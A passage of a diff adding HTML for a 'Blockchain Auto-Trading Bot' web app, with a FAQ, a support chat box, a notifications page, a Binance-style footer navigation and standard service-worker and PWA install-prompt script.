+        <div class="mb-1"><span class="font-semibold">How to connect a wallet?</span><br>Click 'Connect Wallet' on the landing page and follow the prompts.</div>
+        <div class="mb-1"><span class="font-semibold">How to withdraw?</span><br>Go to Home, click Withdraw, follow the steps.</div>
+        <div class="mb-1"><span class="font-semibold">How do I enable 2FA?</span><br>In Account Details, click Secure Account.</div>
+      </div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+        <div class="font-bold mb-2">Live Support AI Bot</div>
+        <div id="supportChatBox" class="max-h-80 overflow-auto bg-gray-800 p-3 rounded mb-3" style="height:220px"></div>
+        <div class="flex gap-2">
+          <input id="supportUserMsg" class="flex-1 input-black-text rounded px-2 py-2" placeholder="Type your message...">
+          <button id="supportSendBtn" class="btn btn-primary">Send</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- NOTIFICATIONS PAGE -->
+    <section id="notifPage" class="page hidden p-4">
+      <div class="text-xl font-bold mb-3">Notifications</div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3 mb-4">
+        <div class="mb-2 flex items-center justify-between">
+          <div>Receive Daily Market Updates</div>
+          <label class="flex items-center cursor-pointer">
+            <input type="checkbox" id="notifPageToggle" class="form-checkbox h-5 w-5 text-yellow-500" />
+            <span class="ml-2 text-xs text-gray-400" id="notifPageToggleLabel"></span>
+          </label>
+        </div>
+      </div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+        <div class="font-bold mb-2">Recent Notifications</div>
+        <div id="notifList"></div>
+      </div>
+    </section>
+  </main>
+
+  <!-- FOOTER NAV (Binance style) -->
+  <footer class="fixed bottom-0 left-0 right-0 bg-black border-t border-gray-800 z-30">
+    <nav class="flex justify-between items-center max-w-3xl mx-auto px-2 py-2">
+      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="home" id="tab-home">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M3 9.5L12 3l9 6.5V21a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5z'/></svg>" class="w-6 h-6" />
+        <span class="text-[11px] mt-0.5">Home</span>
+      </button>
+      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="markets" id="tab-markets">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M3 3v18h18'/><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M7 15l4-6 5 8 3-4'/></svg>" class="w-6 h-6" />
+        <span class="text-[11px]">Markets</span>
+      </button>
+      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="trade" id="tab-trade">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M3 12h18M12 3v18'/></svg>" class="w-6 h-6"/>
+        <span class="text-[11px]">Trade</span>
+      </button>
+      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="futures" id="tab-futures">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M12 2v20M5 7h14'/></svg>" class="w-6 h-6"/>
+        <span class="text-[11px]">Futures</span>
+      </button>
+      <button class="tab flex-1 flex flex-col items-center gap-1 py-1" data-target="wallets" id="tab-wallets">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' stroke='white' viewBox='0 0 24 24'><rect x='2' y='6' width='20' height='12' rx='2'/><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16 12a1 1 0 101 1 1 1 0 00-1-1z'/></svg>" class="w-6 h-6"/>
+        <span class="text-[11px]">Wallets</span>
+      </button>
+    </nav>
+  </footer>
+
+  <!-- PWA/SW Registration -->
+  <script>
+    // register Service Worker
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('service-worker.js');
+      });
+    }
+    // PWA Install Prompt logic
+    let deferredPrompt, showInstallPrompt = false;
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+      showInstallPrompt = true;
+      document.getElementById('installPrompt').classList.remove('hide');
+    });
+    document.getElementById('getMobileAppBtn').onclick = function() {
+      showInstallPrompt = true;
+      document.getElementById('installPrompt').classList.remove('hide');
+    };
+    document.getElementById('installNowBtn').onclick = async function() {
+      if (deferredPrompt) {
+        deferredPrompt.prompt();
+        const { outcome } = await deferredPrompt.userChoice;
+        if (outcome === 'accepted') {
+          document.getElementById('installPrompt').classList.add('hide');
+          showInstallPrompt = false;
+        }
+      } else if (navigator.share) {
+        navigator.share({ title: "Install Blockchain Auto-Trading Bot", url: location.href });
+      } else {
+        alert("To install: Use your browser's menu and select 'Add to Home screen'.");
+      }
+    };
+    document.getElementById('maybeLaterBtn').onclick = function() {
+      showInstallPrompt = false;
+      document.getElementById('installPrompt').classList.add('hide');
+    };
+  </script>
+  <!-- MAIN APP SCRIPT -->
+  <script src="app-bot.js"></script>
+</body>
+</html>
